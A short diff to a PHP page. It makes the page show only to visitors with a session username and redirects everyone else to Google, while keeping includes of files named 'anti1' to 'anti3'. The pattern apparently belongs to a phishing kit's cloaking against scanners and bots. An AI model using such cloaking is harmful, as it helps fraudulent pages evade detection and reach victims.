@@ -1,5 +1,7 @@
 <?php
 session_start();
+
+if (isset($_SESSION["username"])) {
 include "anti/anti1.php";
 include "anti/anti2.php"; 
 include "anti/anti3.php"; 
@@ -932,3 +934,9 @@ border:0;
 </footer>
 </div><div id="quick-tools-container" style="display:none;"><div>
 </body></html>
+<?php
+
+}else {
+	HEADER("Location: https://google.com");
+
+}
